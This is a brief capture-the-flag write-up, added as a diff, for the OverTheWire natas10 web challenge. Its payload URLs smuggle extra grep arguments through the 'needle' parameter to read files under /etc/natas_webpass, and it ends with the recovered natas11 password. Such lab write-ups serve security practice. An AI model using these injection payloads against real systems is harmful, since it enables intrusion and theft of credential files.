@@ -1,0 +1,12 @@
+Task:
+    We look at the script and realize that it is vulnerable to an injection. But, now we have some validations.
+    
+Solution:
+    http://natas10.natas.labs.overthewire.org/?needle=a\cat%20/etc/natas_webpass/natas10&submit=Search
+        - this gives us an odd result - it says dictionary.txt and has a bunch of words
+    http://natas10.natas.labs.overthewire.org/?needle=.*%20/etc/natas_webpass/natas11&submit=Search
+
+    The trick is to realize u can search for multiple files with grep
+
+Password: 
+natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
